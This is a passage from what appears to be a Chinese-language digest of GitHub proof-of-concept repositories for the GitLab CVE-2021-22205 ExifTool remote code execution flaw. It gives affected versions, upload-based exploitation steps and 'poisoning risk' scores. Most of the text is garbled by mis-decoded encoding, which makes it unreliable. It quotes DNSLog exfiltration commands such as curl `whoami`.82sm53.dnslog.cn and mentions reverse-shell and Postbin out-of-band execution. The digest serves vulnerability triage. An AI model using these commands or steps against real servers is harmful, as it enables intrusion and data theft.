*   è™½ç„¶å­˜åœ¨æ‰§è¡Œä»»æ„å‘½ä»¤çš„é£Žé™©ï¼Œä½†è¿™å±žäºŽæ¼æ´žæœ¬èº«çš„ç‰¹æ€§ï¼Œè€Œéžä½œè€…é¢å¤–æ·»åŠ çš„æ¶æ„ä»£ç ã€‚
*   å…¶ä¸­`curl `whoami`.82sm53.dnslog.cn`åªæ˜¯ä¸€ä¸ªDNSLogæ£€æµ‹ï¼Œç”¨äºŽéªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œå¹¶éžæ¶æ„æŠ•æ¯’ã€‚

è™½ç„¶æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´žæ‰§è¡Œæ¶æ„æ“ä½œï¼Œä½†å°±æä¾›çš„POCä»£ç æœ¬èº«è€Œè¨€ï¼Œä¸å­˜åœ¨æ˜Žæ˜¾çš„æŠ•æ¯’è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œå¤§çº¦ä¸º5%ã€‚ä¸»è¦é£Žé™©åœ¨äºŽä½¿ç”¨è¯¥POCè¿›è¡ŒæœªæŽˆæƒçš„æ¸—é€æµ‹è¯•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆè®¿é—®ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ï¼ˆ/users/sign_inï¼‰ï¼ŒèŽ·å–CSRF Tokenã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤å°†åœ¨ExifToolå¤„ç†è¯¥å›¾åƒæ—¶æ‰§è¡Œã€‚`attack` å‡½æ•°ä¸­çš„ä»£ç å…è®¸é€šè¿‡ `-c` å‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…é€šè¿‡/uploads/useræŽ¥å£ä¸Šä¼ æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚åŒæ—¶åœ¨POSTè¯·æ±‚ä¸­å¸¦ä¸ŠCSRF Tokenã€‚
4.  å½“GitLabå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šè§£æžè¯¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚
5.  æ”»å‡»è€…é€šè¿‡DNSLogæˆ–å…¶ä»–æ–¹å¼æ¥æŽ¥æ”¶å‘½ä»¤æ‰§è¡Œçš„ç»“æžœï¼Œæˆ–è€…ç›´æŽ¥åˆ©ç”¨æ‰§è¡Œçš„å‘½ä»¤æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [Al1ex/CVE-2021-22205](https://github.com/Al1ex/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #2

**æ¥æº**: [CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md](../2021/CVE-2021-22205-DIVD-NL_GitLab-cve-2021-22205-nse.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´å®Œå…¨æŽ§åˆ¶å—å½±å“çš„GitLabå®žä¾‹

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨ä¸”å¯ç½‘ç»œè®¿é—®ï¼Œæ— éœ€èº«ä»½éªŒè¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE 11.9 åˆ° 13.10.3 ç‰ˆæœ¬ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ å…·ä½“æ¥è¯´ï¼Œå½“ä¸Šä¼ å›¾åƒæ–‡ä»¶æ—¶ï¼ŒGitLab Workhorse ä¼šå°† jpg|jpeg|tiff æ‰©å±•åçš„æ–‡ä»¶ä¼ é€’ç»™ ExifTool ä»¥åˆ é™¤ä»»ä½•éžç™½åå•çš„æ ‡ç­¾ã€‚ ExifTool å°†å¿½ç•¥æ–‡ä»¶æ‰©å±•åå¹¶å°è¯•æ ¹æ®å†…å®¹ç¡®å®šæ–‡ä»¶ç±»åž‹ï¼Œå…è®¸æ”»å‡»è€…é€šè¿‡é‡å‘½åä¸Šä¼ çš„æ–‡ä»¶æ¥è§¦å‘ DjVu è§£æžå™¨ã€‚ DjVu è§£æžå™¨åœ¨è§£æž DjVu æ³¨é‡Šæ—¶ï¼Œä¼šå¯¹ token è¿›è¡Œ eval æ“ä½œä»¥è½¬æ¢ C è½¬ä¹‰åºåˆ—ã€‚è™½ç„¶å­˜åœ¨ä¸€äº›éªŒè¯æ¥ç¡®ä¿æ‰€æœ‰å†…å®¹éƒ½è¢«æ­£ç¡®è½¬ä¹‰ï¼Œä½†æ˜¯åæ–œæ åŽè·Ÿæ¢è¡Œç¬¦å¯ä»¥è¢«æ­£ç¡®å¤„ç†ï¼Œä»Žè€Œå…è®¸å¼•å·è¢«å…³é—­ï¼Œå¹¶æ’å…¥å’Œè¯„ä¼°ä»»æ„ Perl ä»£ç ã€‚

æä¾›çš„ POC ä»£ç  (CVE-2021-22205.nse) æ˜¯ä¸€ä¸ª Nmap è„šæœ¬ï¼Œå®ƒä¸ç›´æŽ¥åˆ©ç”¨è¯¥æ¼æ´žæ‰§è¡Œä»£ç ï¼Œè€Œæ˜¯é€šè¿‡æ£€æŸ¥ç‰¹å®š CSS æ–‡ä»¶çš„å­˜åœ¨æ¥åˆ¤æ–­ç›®æ ‡ GitLab å®žä¾‹æ˜¯å¦ä¸ºæ˜“å—æ”»å‡»çš„ç‰ˆæœ¬ã€‚ å®ƒé€šè¿‡å‘é€ HTTP GET è¯·æ±‚åˆ° GitLab å®žä¾‹ï¼Œæ ¹æ®è¿”å›žçš„ CSS æ–‡ä»¶å†…å®¹æ¥ç¡®å®šGitLabçš„ç‰ˆæœ¬,å¦‚æžœç‰ˆæœ¬åœ¨å—å½±å“çš„èŒƒå›´å†…,åˆ™è®¤ä¸ºå­˜åœ¨æ¼æ´žã€‚

åˆ©ç”¨æ–¹å¼ï¼š
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DjVu æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„ Perl ä»£ç ã€‚
2.  å°†æ¶æ„æ–‡ä»¶ä¸Šä¼ åˆ°æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ï¼ˆé€šå¸¸ä½œä¸ºå¤´åƒã€é¡¹ç›®logoæˆ–å…¶ä»–å…è®¸ä¸Šä¼ å›¾åƒçš„å­—æ®µï¼‰ã€‚
3.  GitLab Workhorse å°†æ–‡ä»¶ä¼ é€’ç»™ ExifTool è¿›è¡Œå¤„ç†ã€‚
4.  ExifTool è¯†åˆ«å‡º DjVu æ ¼å¼å¹¶è°ƒç”¨ç›¸åº”çš„è§£æžå™¨ã€‚
5.  æ¶æ„ Perl ä»£ç è¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

æŠ•æ¯’é£Žé™©è¯„ä¼°ï¼š
è¯¥ Nmap è„šæœ¬çš„ä¸»è¦ç›®çš„æ˜¯æ£€æµ‹æ¼æ´žæ˜¯å¦å­˜åœ¨ï¼Œè€Œä¸æ˜¯åˆ©ç”¨è¯¥æ¼æ´žã€‚ ä»£ç ä¸­æ²¡æœ‰å‘çŽ°ä»»ä½•å°è¯•æ‰§è¡Œæ¶æ„æ“ä½œæˆ–å‘ç›®æ ‡ç³»ç»Ÿæ¤å…¥åŽé—¨çš„è¿¹è±¡ã€‚ å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Ž (0%)ã€‚


**é¡¹ç›®åœ°å€:** [DIVD-NL/GitLab-cve-2021-22205-nse](https://github.com/DIVD-NL/GitLab-cve-2021-22205-nse)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #3

**æ¥æº**: [CVE-2021-22205-Hikikan_CVE-2021-22205.md](../2021/CVE-2021-22205-Hikikan_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8ï¼›>=13.9, <13.9.6ï¼›>=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç½‘ç»œè®¿é—®ï¼Œå—å½±å“çš„GitLabå®žä¾‹æœªæ‰“è¡¥ä¸

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLab CE/EEä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„æž„é€ çš„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨GitLabä½¿ç”¨çš„ExifToolå·¥å…·ä¸­çš„æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§åˆ†æžï¼š**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ï¼Œè¯¥æ¼æ´žå½±å“GitLab 11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ï¼Œä¸”å±å®³ç­‰çº§ä¸ºCRITICALã€‚æä¾›çš„POCä»£ç `/tmp/2f45104b4dac4f2167b8fc87a9a77f9a/README.md` ä»…ä»…æ˜¯ä¸€ä¸ªè¯´æ˜Žæ–‡ä»¶ï¼Œæœ¬èº«ä¸å…·å¤‡æ¼æ´žåˆ©ç”¨èƒ½åŠ›ï¼Œåªæ˜¯è¯´æ˜Žäº†cveç¼–å·ï¼Œå¹¶æ²¡æœ‰ç»™å‡ºä»»ä½•åˆ©ç”¨payloadï¼Œéœ€è¦é…åˆæœç´¢å¼•æ“ŽæŸ¥æ‰¾çœŸæ­£çš„åˆ©ç”¨ä»£ç ã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**
æä¾›çš„POCä»£ç æ–‡ä»¶å†…å®¹æžå…¶ç®€å•ï¼Œåªæœ‰CVEç¼–å·çš„æè¿°ï¼Œä¸åŒ…å«ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œå› æ­¤æŠ•æ¯’é£Žé™©æžä½Žã€‚å¯ä»¥è®¤ä¸ºæŠ•æ¯’é£Žé™©ä¸º0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…å°†è¯¥å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šï¼Œä¾‹å¦‚é€šè¿‡å¤´åƒä¸Šä¼ ã€é¡¹ç›®å›¾ç‰‡ä¸Šä¼ ç­‰åŠŸèƒ½ã€‚
3.  GitLab ä½¿ç”¨ ExifTool è§£æžè¯¥å›¾åƒæ–‡ä»¶æ—¶ï¼Œæ¶æ„å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ä¼šè¢«æ‰§è¡Œï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

æ”»å‡»è€…å¯ä»¥åœ¨å›¾åƒæ–‡ä»¶ä¸­åµŒå…¥payloadï¼Œé€šå¸¸æ˜¯æž„é€ ä¸€ä¸ªç•¸å½¢çš„å›¾ç‰‡æ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolå¤„ç†å›¾ç‰‡æ–‡ä»¶æ—¶æ‰§è¡Œæ¶æ„å‘½ä»¤ã€‚

**ä¼˜å…ˆçº§ï¼š**
æ ¹æ®æŽ’åºä¼˜å…ˆçº§ï¼Œæœç´¢å¼•æ“Žç»“æžœï¼ˆå½“å‰ä¸ºç©ºï¼‰> æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆç®€å•çš„READMEï¼‰> æ¼æ´žåº“ä¿¡æ¯ã€‚


**é¡¹ç›®åœ°å€:** [Hikikan/CVE-2021-22205](https://github.com/Hikikan/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #4

**æ¥æº**: [CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md](../2021/CVE-2021-22205-NukingDragons_gitlab-cve-2021-22205.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ä¸­ï¼ŒæºäºŽå…¶æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼šæ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œé€šè¿‡ä¸Šä¼ æŽ¥å£ï¼ˆå¦‚ç”¨æˆ·å¤´åƒä¸Šä¼ ï¼‰è§¦å‘ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œä»Žè€Œæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­çš„å‚è€ƒé“¾æŽ¥æŒ‡å‘äº† HackerOne æŠ¥å‘Šå’Œ Packet Storm Security çš„ç›¸å…³åˆ©ç”¨åˆ†æžï¼Œè¯æ˜Žäº†è¯¥æ¼æ´žçš„å¯åˆ©ç”¨æ€§ã€‚æä¾›çš„ bash è„šæœ¬èƒ½å¤Ÿè‡ªåŠ¨åŒ–åˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”¯æŒåå¼¹ shell å’Œè‡ªå®šä¹‰å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©åˆ†æž:**
æä¾›çš„ bash è„šæœ¬ `cve-2021-22205.sh`  ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒï¼Œå¹¶é€šè¿‡ curl å‘½ä»¤ä¸Šä¼ åˆ°ç›®æ ‡ GitLab æœåŠ¡å™¨ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚ ä»£ç æœ¬èº«é€»è¾‘æ¸…æ™°ï¼Œæ²¡æœ‰æ˜Žæ˜¾çš„æ¶æ„è¡Œä¸ºï¼Œå¦‚æœªç»æŽˆæƒçš„æ–‡ä»¶è®¿é—®ã€æ•°æ®çªƒå–ã€æˆ–è€…æ¤å…¥åŽé—¨ç­‰ã€‚

è™½ç„¶ç›®å‰çš„ä»£ç æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ï¼Œä½†æ˜¯ç”±äºŽè„šæœ¬ä¼šæ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„å‘½ä»¤ï¼Œå› æ­¤å­˜åœ¨æ½œåœ¨é£Žé™©ã€‚ç”¨æˆ·éœ€è¦ä»”ç»†æ£€æŸ¥è¿è¡Œçš„å‘½ä»¤ï¼Œé¿å…æ‰§è¡Œæ¶æ„æ“ä½œã€‚æ½œåœ¨çš„æŠ•æ¯’æ–¹å¼å¯èƒ½æ˜¯åœ¨è„šæœ¬ä¸­æ·»åŠ éšè”½çš„é€»è¾‘ï¼Œä¾‹å¦‚æ ¹æ®ç›®æ ‡çŽ¯å¢ƒæ‰§è¡Œä¸åŒçš„å‘½ä»¤ã€‚å› æ­¤ï¼Œä»£ç çš„å®‰å…¨æ€§è¯„ä¼°å¹¶éžç»å¯¹ï¼Œéœ€è¦ç»“åˆå…·ä½“ä½¿ç”¨åœºæ™¯è¿›è¡Œç»¼åˆåˆ¤æ–­ã€‚ ä»£ç ä¸­åˆ›å»ºä¸´æ—¶æ–‡ä»¶, å¹¶ä¸”è¿›è¡Œåˆ é™¤å¯ä»¥åˆ¤å®š,ä½œè€…çš„ç¼–ç ä¹ æƒ¯è‰¯å¥½.

**æ¼æ´žåˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆèŽ·å–ç›®æ ‡ GitLab å®žä¾‹çš„ CSRF Token å’Œ Session Cookieã€‚
2.  ç„¶åŽï¼Œæž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥å…ƒæ•°æ®ä¸­åŒ…å«äº†è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  ä½¿ç”¨ curl å‘½ä»¤ï¼Œå°†æž„é€ çš„æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨çš„å¤´åƒä¸Šä¼ æŽ¥å£ã€‚
4.  GitLab è°ƒç”¨ ExifTool å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifTool åœ¨è§£æžå›¾åƒå…ƒæ•°æ®æ—¶ï¼Œä¼šæ‰§è¡Œæ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚
5. æ”»å‡»è€…å¯ä»¥é€šè¿‡åå¼¹ shell æˆ–è€…æ‰§è¡Œè‡ªå®šä¹‰å‘½ä»¤æ¥æŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [NukingDragons/gitlab-cve-2021-22205](https://github.com/NukingDragons/gitlab-cve-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #5

**æ¥æº**: [CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md](../2021/CVE-2021-22205-ZZ-SOCMAP_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶GitLabæœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œåªéœ€ç½‘ç»œè®¿é—®å³å¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒåŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU æ–‡ä»¶ï¼‰ï¼Œå½“ GitLab å°è¯•å¤„ç†è¯¥æ–‡ä»¶æ—¶ï¼ŒExifTool ä¼šæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå› ä¸ºå®ƒå®žçŽ°äº†æ¼æ´žåˆ©ç”¨æ‰€éœ€çš„æ­¥éª¤ï¼š

1.  æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ï¼ˆDJVU æ ¼å¼ï¼‰ã€‚ å…ƒæ•°æ®ä¸­åµŒå…¥äº†æ‰§è¡Œå‘½ä»¤çš„ payloadã€‚ å…·ä½“çš„payloadåœ¨ `rce_payload` å‡½æ•°ä¸­æž„é€ , ä½¿ç”¨äº† `qx{}` åŒ…è£¹å‘½ä»¤ã€‚
2.  åˆ›å»ºé¡¹ç›®ï¼ŒèŽ·å–`csrf_token`ï¼Œå’Œ`_gitlab_session`ã€‚
3.  ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ°æ–°é¡¹ç›®çš„snippetï¼Œè§¦å‘æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POCä»£ç å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£Žé™©ï¼Œå¤§çº¦ä¸º10%ã€‚è™½ç„¶ä¸»è¦ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´žï¼Œä½†éœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

*   **dnslog.cn:** ä»£ç ä¸­ä½¿ç”¨ `whoami`.q3ddlk.dnslog.cn åŸŸåè¿›è¡Œå‘½ä»¤æ‰§è¡Œç»“æžœçš„å›žä¼ ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹è¯¥åŸŸåæ¥æ”¶é›†å—å®³è€…çš„ä¿¡æ¯ï¼Œä»Žè€Œè¿›è¡Œè¿›ä¸€æ­¥çš„æ”»å‡»ã€‚è™½ç„¶åœ¨æµ‹è¯•ä¸­è¿™æ–¹ä¾¿äº†æ¼æ´žéªŒè¯ï¼Œä½†åœ¨å®žé™…æ”»å‡»ä¸­ï¼Œæ¶æ„åŸŸåå¯èƒ½è¢«ç”¨äºŽæ›´éšè”½çš„ç›®çš„ï¼Œå¦‚C2é€šä¿¡ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š

1.  **æ¼æ´žå‘çŽ°ï¼š** GitLab æœªæ­£ç¡®éªŒè¯ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´ ExifTool åœ¨å¤„ç†å›¾åƒæ—¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
2.  **Payload æž„é€ ï¼š** æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ ExifTool å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å…ƒæ•°æ®åŒ…å«è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  **æ–‡ä»¶ä¸Šä¼ ï¼š** æ”»å‡»è€…ä¸Šä¼ æ¶æ„å›¾åƒæ–‡ä»¶åˆ° GitLabï¼Œé€šå¸¸æ˜¯é€šè¿‡é¡¹ç›®åˆ›å»ºï¼Œæˆ–è€…ä¸Šä¼ åˆ° Issue æˆ– Merge Request ä¸­ã€‚
4.  **å‘½ä»¤æ‰§è¡Œï¼š** å½“ GitLab å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifTool æ‰§è¡ŒåµŒå…¥çš„å‘½ä»¤ã€‚åˆ©ç”¨ä»£ç åˆ›å»ºé¡¹ç›®ï¼Œå¹¶èŽ·å–åˆ›å»ºsnippetçš„tokenï¼Œæœ€åŽä¸Šä¼ æ–‡ä»¶è§¦å‘ã€‚
5.  **RCEï¼š** æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´žï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [ZZ-SOCMAP/CVE-2021-22205](https://github.com/ZZ-SOCMAP/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #6

**æ¥æº**: [CVE-2021-22205-c0okB_CVE-2021-22205.md](../2021/CVE-2021-22205-c0okB_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ª GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§:**
æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œæ­¤æ¼æ´žPOCæœ‰æ•ˆã€‚æ¼æ´žåº“ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡æ¼æ´žï¼ŒCISA KEVä¸­ä¹Ÿæ ‡è®°ä¸ºå·²çŸ¥è¢«åˆ©ç”¨æ¼æ´žï¼Œç»“åˆæä¾›çš„ä»£ç ï¼Œè¯æ˜Žè¯¥æ¼æ´žå­˜åœ¨ä¸”å®¹æ˜“è¢«åˆ©ç”¨ã€‚

**æŠ•æ¯’é£Žé™©:**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œè¯¥ä»£ç ä¸»è¦å®žçŽ°äº†ä»¥ä¸‹åŠŸèƒ½ï¼š

*   DNSLog æŽ¢æµ‹ï¼šé€šè¿‡ DNSLog éªŒè¯æ¼æ´žæ˜¯å¦å­˜åœ¨ã€‚
*   RCEï¼šåˆ©ç”¨ Postbin è¿›è¡Œå¸¦å¤–å‘½ä»¤æ‰§è¡Œã€‚
